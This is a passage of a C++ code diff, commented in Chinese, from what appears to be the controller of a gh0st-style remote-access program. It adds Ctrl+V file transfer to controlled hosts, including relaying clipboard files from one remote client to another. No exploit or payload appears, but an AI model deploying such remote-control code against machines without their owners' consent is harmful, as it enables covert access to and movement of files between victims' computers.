+                                Mprintf("【Ctrl+V】 [本地 -> 远程] V2 传输: %zu 个文件\n", files.size());
+                            } else {
+                                // V1 传输（兼容旧客户端）
+                                auto str = BuildMultiStringPath(files);
+                                BYTE* szBuffer = new BYTE[81 + str.size()];
+                                szBuffer[0] = { COMMAND_GET_FOLDER };
+                                std::string masterId = GetPwdHash(), hmac = GetHMAC(100);
+                                memcpy((char*)szBuffer + 1, masterId.c_str(), masterId.length());
+                                memcpy((char*)szBuffer + 1 + masterId.length(), hmac.c_str(), hmac.length());
+                                memcpy(szBuffer + 1 + 80, str.data(), str.size());
+                                auto md5 = CalcMD5FromBytes((BYTE*)str.data(), str.size());
+                                g_2015RemoteDlg->m_CmdList.PutCmd(md5);
+                                dlg->m_ContextObject->Send2Client(szBuffer, 81 + str.size());
+                                SAFE_DELETE_ARRAY(szBuffer);
+                                Mprintf("【Ctrl+V】 [本地 -> 远程] V1 传输: %s\n", md5.c_str());
+                            }
                         } else {
                             CString strText = GetClipboardText();
                             if (!strText.IsEmpty()) {
@@ -4937,6 +5521,73 @@ LRESULT CALLBACK CMy2015RemoteDlg::LowLevelKeyboardProc(int nCode, WPARAM wParam
                             } else {
                                 Mprintf("【Ctrl+V】 本地剪贴板没有文本或文件: %d \n", result);
                             }
+                        }
+                    } else if (dlg && operateWnd && dlg != operateWnd && (time(nullptr) - remoteCtrlCTime < 60)) {
+                        // [3] 远程A -> 远程B (C2C)
+                        auto srcScreen = (CScreenSpyDlg*)operateWnd;
+                        auto dstScreen = (CScreenSpyDlg*)dlg;
+
+                        if (!srcScreen->m_bIsCtrl || !dstScreen->m_bIsCtrl) {
+                            Mprintf("【Ctrl+V】 [C2C] 窗口不是控制状态\n");
+                            break;
+                        }
+
+                        // 检查连接对象是否有效
+                        if (!srcScreen->m_ContextObject || !dstScreen->m_ContextObject) {
+                            Mprintf("【Ctrl+V】 [C2C] 连接对象无效\n");
+                            break;
+                        }
+
+                        // 获取源和目标的客户端ID
+                        uint64_t srcClientID = srcScreen->GetClientID();
+                        uint64_t dstClientID = dstScreen->GetClientID();
+
+                        if (srcClientID == 0 || dstClientID == 0) {
+                            Mprintf("【Ctrl+V】 [C2C] 客户端ID无效: src=%llu, dst=%llu\n", srcClientID, dstClientID);
+                            break;
+                        }
+
+                        // 检查双方是否支持 V2 文件传输协议
+                        context* srcMainCtx = g_2015RemoteDlg->FindHost(srcClientID);
+                        context* dstMainCtx = g_2015RemoteDlg->FindHost(dstClientID);
+                        if (!srcMainCtx || !dstMainCtx) {
+                            Mprintf("【Ctrl+V】 [C2C] 主连接无效\n");
+                            break;
+                        }
+                        if (!SupportsFileTransferV2(srcMainCtx) || !SupportsFileTransferV2(dstMainCtx)) {
+                            Mprintf("【Ctrl+V】 [C2C] 客户端版本不支持 V2 传输 (需要 >= %s)\n", FILE_TRANSFER_V2_DATE);
+                            break;
+                        }
+
+                        // 构建 C2C 剪贴板请求
+                        ClipboardRequestV2 req = {};
+                        req.cmd = COMMAND_CLIPBOARD_V2;
+                        req.srcClientID = srcClientID;
+                        req.dstClientID = dstClientID;
+                        req.transferID = GenerateTransferID();
+
+                        std::string masterId = GetPwdHash(), hmac = GetHMAC(100);
+                        memcpy(req.hash, masterId.c_str(), min(masterId.length(), sizeof(req.hash)));
+                        memcpy(req.hmac, hmac.c_str(), min(hmac.length(), sizeof(req.hmac)));
+
+                        // 先通知目标客户端准备接收（捕获当前目录）
+                        // 注意：必须发送到主连接（KernelManager），不是远程桌面会话
+                        C2CPreparePacket prepare = {};
+                        prepare.cmd = COMMAND_C2C_PREPARE;
+                        prepare.transferID = req.transferID;
+                        prepare.srcClientID = srcClientID;  // 源客户端，用于返回目录响应
+                        dstMainCtx->Send2Client((BYTE*)&prepare, sizeof(prepare));
+                        Mprintf("【Ctrl+V】 [C2C] 通知目标准备: %s, transferID=%llu, src=%llu\n",
+                            dstScreen->m_IPAddress, req.transferID, srcClientID);
+
+                        // 发送请求到源客户端，让它发送剪贴板文件到目标客户端
+                        if (srcScreen->m_ContextObject->Send2Client((BYTE*)&req, sizeof(req))) {
+                            Mprintf("【Ctrl+V】 [C2C] 远程 %s -> 远程 %s, transferID=%llu\n",
+                                srcScreen->m_IPAddress, dstScreen->m_IPAddress, req.transferID);
+                            // C2C 传输已处理，阻止按键传递到目标客户端
+                            return 1;
+                        } else {
+                            Mprintf("【Ctrl+V】 [C2C] 发送请求失败\n");
                         }
                     } else if (g_2015RemoteDlg->GetActiveRemoteSession() && operateWnd) {
                         auto screen = (CScreenSpyDlg*)(g_2015RemoteDlg->GetActiveRemoteSession());
@@ -5133,6 +5784,15 @@ void CMy2015RemoteDlg::OnParamPrivacyWallpaper()
         msg.Format(_TR("隐私屏幕壁纸已设置为:\n%s"), path);
         MessageBox(msg, _TR("设置成功"), MB_ICONINFORMATION);
     }
+}
+
+void CMy2015RemoteDlg::OnParamFileV2()
+{
+    m_bEnableFileV2 = !m_bEnableFileV2;
+    CMenu* SubMenu = m_MainMenu.GetSubMenu(2);
+    SubMenu->CheckMenuItem(ID_PARAM_FILE_V2, m_bEnableFileV2 ? MF_CHECKED : MF_UNCHECKED);
+    THIS_CFG.SetInt("settings", "EnableFileV2", m_bEnableFileV2 ? 1 : 0);
+    Mprintf("文件传输V2: %s\n", m_bEnableFileV2 ? "启用" : "禁用");
 }
 
 
